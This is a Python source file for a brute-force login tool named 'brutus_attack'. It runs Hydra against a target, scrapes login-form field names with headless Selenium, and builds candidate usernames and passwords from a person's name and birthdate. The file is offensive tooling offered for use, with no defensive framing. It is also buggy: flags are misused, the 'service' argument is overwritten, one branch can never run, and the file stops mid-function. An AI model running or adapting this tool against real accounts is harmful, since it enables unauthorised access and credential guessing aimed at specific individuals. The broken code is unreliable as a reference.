import tkinter as tk
from tkinter import ttk
import subprocess
import requests
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.common.exceptions import WebDriverException
import re

def brutus_attack(target, username, password, username_list, password_list, source, scrape_url, guess_info, service):
    # Placeholder for actual brute force logic
    print(f"Attempting brute force on {target} with source: {source}")
    
    if source == "Manual Input":
        command = ["hydra"]
        if username:
            command.extend(["-l", username])
        if password:
            command.extend(["-p", password])
        if username_list:
            command.extend(["-L", username_list])
        if password_list:
            command.extend(["-P", password_list])
        command.extend(["-s", service])
        command.append(target)

        try:
            result = subprocess.run(command, capture_output=True, text=True)
            print(result.stdout)
            print(result.stderr)
            return result.stdout
        except Exception as e:
            return str(e)
    elif source == "Scrape from Site":
        try:
            chrome_options = Options()
            chrome_options.add_argument("--headless")
            service = Service('./chromedriver')
            driver = webdriver.Chrome(service=service, options=chrome_options)
            driver.get(scrape_url)
            soup = BeautifulSoup(driver.page_source, 'html.parser')
            
            usernames = []
            passwords = []
            
            for form in soup.find_all('form'):
                for input_tag in form.find_all('input'):
                    name = input_tag.get('name', '').lower()
                    if input_tag.get('type') == 'text' or input_tag.get('type') == 'email' or 'user' in name or 'login' in name or 'email' in name:
                        usernames.append(input_tag.get('name', ''))
                    elif input_tag.get('type') == 'password' or 'pass' in name or 'pwd' in name or 'password' in name:
                        passwords.append(input_tag.get('name', ''))
            
            if not usernames and not passwords:
                for input_tag in soup.find_all('input'):
                    name = input_tag.get('name', '').lower()
                    if input_tag.get('type') == 'text' or input_tag.get('type') == 'email' or 'user' in name or 'login' in name or 'email' in name:
                        usernames.append(input_tag.get('name', ''))
                    elif input_tag.get('type') == 'password' or 'pass' in name or 'pwd' in name or 'password' in name:
                        passwords.append(input_tag.get('name', ''))
            
            # Handle iframes
            iframes = soup.find_all('iframe')
            for iframe in iframes:
                try:
                    driver.switch_to.frame(iframe)
                    soup = BeautifulSoup(driver.page_source, 'html.parser')
                    for form in soup.find_all('form'):
                        for input_tag in form.find_all('input'):
                            name = input_tag.get('name', '').lower()
                            if input_tag.get('type') == 'text' or input_tag.get('type') == 'email' or 'user' in name or 'login' in name or 'email' in name:
                                usernames.append(input_tag.get('name', ''))
                            elif input_tag.get('type') == 'password' or 'pass' in name or 'pwd' in name or 'password' in name:
                                passwords.append(input_tag.get('name', ''))
                    
                    if not usernames and not passwords:
                        for input_tag in soup.find_all('input'):
                            name = input_tag.get('name', '').lower()
                            if input_tag.get('type') == 'text' or input_tag.get('type') == 'email' or 'user' in name or 'login' in name or 'email' in name:
                                usernames.append(input_tag.get('name', ''))
                            elif input_tag.get('type') == 'password' or 'pass' in name or 'pwd' in name or 'password' in name:
                                passwords.append(input_tag.get('name', ''))
                    driver.switch_to.default_content()
                except WebDriverException:
                    driver.switch_to.default_content()
                    continue
            
            driver.quit()
            
            command = ["hydra"]
            if usernames:
                command.extend(["-L", ",".join(usernames)])
            if passwords:
                command.extend(["-P", ",".join(passwords)])
            command.extend(["-s", service])
            command.append(target)
            
            try:
                result = subprocess.run(command, capture_output=True, text=True)
                print(result.stdout)
                print(result.stderr)
                return result.stdout
            except Exception as e:
                return str(e)
            
        except requests.exceptions.RequestException as e:
            return f"Error scraping site: {e}"
        except Exception as e:
            return f"Error scraping site with selenium: {e}"
    elif source == "Guess from Info":
        # Placeholder for guessing logic
        info_parts = [part.strip() for part in guess_info.split(',')]
        if len(info_parts) < 2:
            return "Please provide at least a name and a birthdate"
        name = info_parts[0]
        birthdate = info_parts[1]
        
        name_parts = name.lower().split(" ")
        potential_usernames = []
        potential_passwords = []
        
        if len(name_parts) > 1:
            potential_usernames.append(f"{name_parts[0]}{name_parts[1]}")
            potential_usernames.append(f"{name_parts[0]}.{name_parts[1]}")
            potential_usernames.append(f"{name_parts[0]}_{name_parts[1]}")
            potential_usernames.append(f"{name_parts[0][0]}{name_parts[1]}")
            potential_usernames.append(f"{name_parts[0]}{name_parts[1][0]}")
        else:
            potential_usernames.append(name_parts[0])
        
        potential_passwords.append(name)
        potential_passwords.append(name + "123")
        potential_passwords.append(name + "!")
        potential_passwords.append(birthdate)
        potential_passwords.append(birthdate.replace("-", ""))
        potential_passwords.append(birthdate.replace("-", "")[2:])
        potential_passwords.append(birthdate.replace("-", "")[:4])
        potential_passwords.append(birthdate.replace("-", "")[2:])
        potential_passwords.append(birthdate.replace("-", "")[:4])
        
        if len(name_parts) > 1:
            potential_passwords.append(f"{name_parts[0]}{birthdate.replace('-', '')}")
            potential_passwords.append(f"{name_parts[1]}{birthdate.replace('-', '')}")
            potential_passwords.append(f"{name_parts[0]}{birthdate.replace('-', '')[:4]}")
            potential_passwords.append(f"{name_parts[1]}{birthdate.replace('-', '')[:4]}")
        elif len(name_parts) == 1:
            potential_passwords.append(f"{name_parts[0]}{birthdate.replace('-', '')}")
            potential_passwords.append(f"{name_parts[0]}{birthdate.replace('-', '')[:4]}")
        elif len(name_parts) > 2:
            potential_passwords.append(f"{name_parts[0]}{name_parts[1]}{birthdate.replace('-', '')}")
            potential_passwords.append(f"{name_parts[0]}{name_parts[2]}{birthdate.replace('-', '')}")
            potential_passwords.append(f"{name_parts[0]}{name_parts[1]}{birthdate.replace('-', '')[:4]}")
            potential_passwords.append(f"{name_parts[0]}{name_parts[2]}{birthdate.replace('-', '')[:4]}")
